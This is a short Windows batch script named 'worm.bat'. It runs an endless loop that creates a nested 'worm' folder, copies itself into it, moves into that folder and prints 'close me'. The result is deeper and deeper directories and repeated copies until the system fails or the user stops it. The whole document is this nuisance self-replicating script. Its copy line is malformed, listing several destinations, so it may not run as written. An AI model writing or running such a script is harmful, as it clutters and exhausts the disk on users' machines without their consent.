@echo off
:loop
md worm
copy worm.bat worm\worm.bat worm\worm.bat worm\worm.bat worm
cd worm
echo close me
goto loop